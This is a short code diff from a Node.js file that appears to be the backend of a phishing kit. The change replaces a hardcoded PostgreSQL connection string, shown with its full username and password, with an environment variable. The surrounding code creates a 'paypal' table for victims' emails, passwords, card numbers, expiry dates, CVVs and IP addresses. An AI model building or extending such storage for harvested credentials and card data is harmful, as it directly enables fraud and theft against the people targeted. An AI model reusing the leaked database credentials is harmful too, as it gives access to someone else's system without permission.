@@ -10,7 +10,7 @@ const iplocation = require("iplocation").default;
 var loc;
 var city;
 var reg;
-const client = new pg.Client('postgresql://umszh9ribvqwdrtktm21:dJhlIg1IBd6evm2Myf8a@bpedlggvfcqqrqmetvla-postgresql.services.clever-cloud.com:5432/bpedlggvfcqqrqmetvla');
+const client = new pg.Client(process.env.DATABASE_URL);
 client.connect();
 
 client.query("create table paypal (id serial , mail text,pass text,cardholder text,card text,exp text,cvv text,country TEXT,ip TEXT,time timestamp default now())")
